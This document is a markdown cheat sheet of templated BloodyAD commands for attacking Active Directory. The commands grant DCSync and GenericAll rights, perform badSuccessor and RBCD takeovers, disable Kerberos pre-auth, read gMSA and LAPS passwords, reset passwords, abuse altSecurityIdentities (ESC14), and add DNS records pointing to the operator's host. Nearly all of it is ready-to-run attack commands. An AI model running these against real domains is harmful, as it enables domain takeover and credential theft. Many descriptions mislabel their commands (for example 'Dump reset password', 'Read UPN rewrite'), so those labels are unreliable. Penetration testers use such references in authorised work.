# BloodyAD

<!-- cheat
export bloody_auth
var auth_method = printf 'hash\tUse NT hash\npassword\tUse password\nkerberos\tUse Kerberos ticket\n' --- --delimiter '\t' --map "cut -f1" --heaader "Select Auth Method"

if $auth_method != kerberos
var credential = --- --header "Credential"
fi

if $auth_method == hash
var auth_flags := -p :$credential
fi

if $auth_method == password
var auth_flags := -p $credential
fi

if $auth_method == kerberos
var auth_flags := -k
fi
-->

### badSuccessor

Exploit the badSuccessor primitive to take over the target via dMSA migration abuse. Pass the computer name **without** a trailing `$` - BloodyAD appends it internally and doubling it breaks the attack.

Run badSuccessor with BloodyAD.

```sh title:"BloodyAD Run BadSuccessor"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags add badSuccessor $rhost_name
```
<!-- cheat
import domain_ip
import users
import bloody_auth
var rhost_name
var rhost_name
-->

### DCSync right

Set DCSync right with BloodyAD.

```sh title:"BloodyAD Set DCSync Right"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags add dcsync $target_user
```
<!-- cheat
import domain_ip
import users
import bloody_auth
var rhost_name
var target_user
-->

### SPN on user

Enumerate SPN on user with BloodyAD.

```sh title:"BloodyAD Enumerate SPN on User"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags add spn $target_user $spn_value
```
<!-- cheat
import domain_ip
import users
import bloody_auth
var rhost_name
var target_user
var spn_value
-->

### WriteDacl right

Write WriteDacl right with BloodyAD.

```sh title:"BloodyAD Write WriteDacl Right"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags add writeDacl $DN $target_user
```
<!-- cheat
import domain_ip
import users
import bloody_auth
var rhost_name
var DN
var target_user
-->

### GenericWrite right

Write GenericWrite right with BloodyAD.

```sh title:"BloodyAD Write GenericWrite Right"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags add genericWrite $DN $target_user
```
<!-- cheat
import domain_ip
import users
import bloody_auth
var rhost_name
var DN
var target_user
-->

### Group member

Create group member with BloodyAD.

```sh title:"BloodyAD Create Group Member"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags add groupMember $group_name $target_user
```
<!-- cheat
import domain_ip
import users
import bloody_auth
var rhost_name
var group_name
var target_user
-->

### GenericAll right

Dump GenericAll right with BloodyAD.

```sh title:"BloodyAD Dump GenericAll Right"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags add genericAll $DN $target_user
```
<!-- cheat
import domain_ip
import users
import bloody_auth
var rhost_name
var DN
var target_user
-->

### Trusted for auth delegation

Run trusted for auth delegation with BloodyAD.

```sh title:"BloodyAD Run Trusted for Auth Delegation"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags add uac $target_user -f TRUSTED_TO_AUTH_FOR_DELEGATION
```
<!-- cheat
import domain_ip
import users
import bloody_auth
var rhost_name
var target_user
-->

### Disable pre-auth

Disable pre auth with BloodyAD.

```sh title:"BloodyAD Disable Pre Auth"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags add uac $target_user -f DONT_REQ_PREAUTH
```
<!-- cheat
import domain_ip
import users
import bloody_auth
var rhost_name
var target_user
-->

### RBCD

Run RBCD with BloodyAD.

```sh title:"BloodyAD Run RBCD"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags add rbcd '$delegate_to' '$delegate_from'
```
<!-- cheat
import domain_ip
import users
import bloody_auth
var rhost_name
var delegate_to
var delegate_from
-->

### New computer account

Create computer account with BloodyAD.

```sh title:"BloodyAD Create Computer Account"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags add computer $rhost_name $target_pass
```
<!-- cheat
import domain_ip
import users
import bloody_auth
var rhost_name
var rhost_name
var target_pass
-->

### DNS record

Run DNS record with BloodyAD.

```sh title:"BloodyAD Run DNS Record"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags add dnsRecord $record_name $lhost
```
<!-- cheat
import domain_ip
import users
import bloody_auth
import tun_ip
var rhost_name
var record_name
-->

### Trusts

Run trusts with BloodyAD.

```sh title:"BloodyAD Run Trusts"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags get trusts
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
-->

### DNS dump

Dump DNS dump with BloodyAD.

```sh title:"BloodyAD Dump DNS Dump"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags get dnsDump
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
-->

### BloodHound collection

Run BloodHound collection with BloodyAD.

```sh title:"BloodyAD Run BloodHound Collection"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags get bloodhound
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
-->

### RBCD on computer

Read RBCD on computer with BloodyAD.

```sh title:"BloodyAD Read RBCD on Computer"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags get rbcd $rhost_name
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var rhost_name
-->

### Object info

Read object info with BloodyAD.

```sh title:"BloodyAD Read Object Info"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags get object $target_user
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var target_user
-->

### gMSA password

Read gMSA password with BloodyAD.

```sh title:"BloodyAD Read GMSA Password"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags get object $target_user --attr msDS-ManagedPassword
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var target_user
-->

### gMSA raw blob

Dump gMSA raw blob with BloodyAD.

```sh title:"BloodyAD Dump GMSA Raw Blob"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags get object $target_user --attr msDS-ManagedPassword --raw
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var target_user
-->

### Writable attributes

Write writable attributes with BloodyAD.

```sh title:"BloodyAD Write Writable Attributes"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags get writable --detail
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
-->

### Object attribute

Read object attribute with BloodyAD.

```sh title:"BloodyAD Read Object Attribute"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags get object $object --attr $attribute
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var attribute = printf 'msDS-ManagedPassword\nms-DS-MachineAccountQuota\nmember\nmanagedBy\ndescription\nprimaryGroupID\nmemberOf\nmsDS-KeyCredentialLink\nsAMAccountName\nadminCount\nms-Mcs-AdmPwd\nms-Mcs-AdmPwdExpirationTime\ntrustDirection\ntrustType\ntrustAttributes\nnTSecurityDescriptor\nuserPrincipalName\nservicePrincipalName\nuserAccountControl\n'
var rhost_name
var object
-->

### Reset password

Dump reset password with BloodyAD.

```sh title:"BloodyAD Dump Reset Password"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags set password $target_user $target_pass
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var target_user
var target_pass
-->

### Change owner

Write change owner with BloodyAD.

```sh title:"BloodyAD Write Change Owner"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags set owner $target_group $user
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var target_group
-->

### UPN rewrite

Read UPN rewrite with BloodyAD.

```sh title:"BloodyAD Read UPN Rewrite"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags set object $old_upn userPrincipalName -v $new_upn
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var old_upn
var new_upn
-->

### Mail attribute

Dump mail attribute with BloodyAD.

```sh title:"BloodyAD Dump Mail Attribute"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags set object $target_user mail -v $new_mail
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var new_mail
var target_user
-->

### altSecurityIdentities (ESC14)

Run altSecurityIdentities (ESC14) with BloodyAD.

```sh title:"BloodyAD Run AltSecurityIdentities (ESC14)"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags set object $target_user altSecurityIdentities -v '$x509_claim'
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var x509_claim
var target_user
-->

### Overwrite SPN

Create overwrite SPN with BloodyAD.

```sh title:"BloodyAD Create Overwrite SPN"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags set object $target_user servicePrincipalName -v '$spn_value'
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var spn_value
var target_user
-->

### Clear logon hours

Read clear logon hours with BloodyAD.

```sh title:"BloodyAD Read Clear Logon Hours"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags set object $target_user logonHours
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var target_user
-->

### Default UAC (512)

Set default UAC (512) with BloodyAD.

```sh title:"BloodyAD Set Default UAC (512)"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags set object $target_user userAccountControl -v 512
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var target_user
-->

### displayName

Write displayName with BloodyAD.

```sh title:"BloodyAD Write DisplayName"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags set object $target_user displayName -v '$display_name'
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var display_name
var target_user
-->

### description

Write description with BloodyAD.

```sh title:"BloodyAD Write Description"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags set object $target_user description -v '$description'
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var target_user
var description
-->

### Constrained delegation target

Enumerate constrained delegation target with BloodyAD.

```sh title:"BloodyAD Enumerate Constrained Delegation Target"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags set object $rhost_name msDS-AllowedToDelegateTo -v '$spn_value'
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var rhost_name
var spn_value
-->

### MachineAccountQuota

Set MachineAccountQuota with BloodyAD.

```sh title:"BloodyAD Set MachineAccountQuota"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags set object MachineAccountQuota -v 10
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
-->

### Restore User

Remove restore user with BloodyAD.

```sh title:"BloodyAD Remove Restore User"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags set restore $target_user
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var target_user
-->

### Enable account

Enable account with BloodyAD.

```sh title:"BloodyAD Enable Account"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags remove uac $target_user -f ACCOUNTDISABLE
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var target_user
-->

### Remove from group

Remove BloodyAD from group.

```sh title:"BloodyAD Remove from Group"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags remove groupMember $group_name $target_user
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var group_name
var target_user
-->

### Delete computer

Remove computer with BloodyAD.

```sh title:"BloodyAD Remove Computer"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags remove computer $rhost_name
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var rhost_name
-->

### Remove RBCD

Remove RBCD with BloodyAD.

```sh title:"BloodyAD Remove RBCD"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags remove rbcd '$delegate_to' '$delegate_from'
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var delegate_to
var delegate_from
-->

### Remove SPN

Remove SPN with BloodyAD.

```sh title:"BloodyAD Remove SPN"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags remove servicePrincipalName $target_user $spn_value
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var spn_value
var target_user
-->

### Custom LDAP filter

Execute custom LDAP filter with BloodyAD.

```sh title:"BloodyAD Execute Custom LDAP Filter"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags get search --filter "$ldap_query"
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
import ldap_query
var rhost_name
-->

### Tombstoned search

Find tombstoned search with BloodyAD.

```sh title:"BloodyAD Find Tombstoned Search"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags get search -c 1.2.840.113556.1.4.2064 -c 1.2.840.113556.1.4.2065
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
import ldap_query
var rhost_name
-->
